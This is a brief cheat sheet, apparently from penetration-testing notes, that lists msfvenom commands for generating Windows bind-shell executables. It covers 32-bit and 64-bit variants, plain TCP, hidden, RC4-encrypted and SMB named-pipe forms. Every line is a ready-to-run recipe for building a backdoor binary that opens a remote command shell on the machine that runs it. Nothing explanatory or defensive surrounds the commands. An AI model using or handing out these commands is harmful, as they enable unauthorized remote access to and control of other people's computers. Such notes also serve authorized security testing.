# Bind Shells

1. x86 (32-bit) Payloads

`$ msfvenom -p windows/shell/bind_tcp lport=<PORT> -f exe -o shell-x86.exe`

`$ msfvenom -p windows/shell/bind_hidden_tcp ahost=<IP> lport=<PORT> -f exe -o hidden-shell-x86.exe`

`$ msfvenom -p windows/shell/bind_tcp_rc4 lport=<PORT> rc4password=<KEY> -f exe -o shell-x86.exe`

For the SMB pipe the default for LPORT will always be port 445

`$ msfvenom -p windows/shell/bind_named_pipe lport=<PORT> pipename=<PIPENAME> -f exe -o shell-x86.exe`

2. x86-64 (64-bit) Payloads

`$ msfvenom -p windows/x64/shell/bind_tcp lport=<PORT> -f exe -o shell-x86-64.exe`

`$ msfvenom -p windows/x64/shell/bind_tcp_rc4 lport=<PORT> rc4password=<KEY> -f exe -o shell-x86-64.exe`